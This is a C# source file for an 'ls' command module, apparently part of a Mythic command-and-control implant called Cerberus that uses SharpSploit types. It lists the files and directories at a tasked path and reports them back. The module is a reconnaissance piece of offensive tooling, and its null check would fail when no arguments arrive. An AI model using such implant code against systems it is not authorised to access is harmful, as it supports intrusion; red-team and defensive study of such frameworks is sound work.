using Agent;

using Models.Tasks;

using Extend;

using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Tasks.Commands
{
    public class ListDirectory : CerberusCommand
    {
        public override string Name => "ls";

        public override MythicTaskResult Execute(MythicTask task)
        {
            var results = new SharpSploitResultList<ListDirectoryResult>();
            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<LsParam>();
            MythicTaskResult result;

            if (Arguments is null || string.IsNullOrWhiteSpace(Arguments.path))
            {
                Arguments.path = Directory.GetCurrentDirectory();
            }

            var files = Directory.GetFiles(Arguments.path);

            foreach (var file in files)
            {
                var fileInfo = new FileInfo(file);
                results.Add(new ListDirectoryResult
                {
                    Name = fileInfo.FullName,
                    Length = fileInfo.Length
                });
            }

            var directories = Directory.GetDirectories(Arguments.path);

            foreach (var directory in directories)
            {
                var dirInfo = new DirectoryInfo(directory);
                results.Add(new ListDirectoryResult
                {
                    Name = dirInfo.Name,
                    Length = 0
                });
            }

            result = new MythicTaskResult
            {
                task_id = task.id,
                user_output = results.ToString(),
                completed = true,
                status = "success"
            };

            return result;
        }

        public sealed class ListDirectoryResult : SharpSploitResult
        {
            public string Name { get; set; }
            public long Length { get; set; }

            protected override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>
            {
                new SharpSploitResultProperty{Name = nameof(Name), Value = Name},
                new SharpSploitResultProperty{Name = nameof(Length), Value = Length}
            };
        }

        public class LsParam
        {
            public string path { get; set; }
        }
    }
}
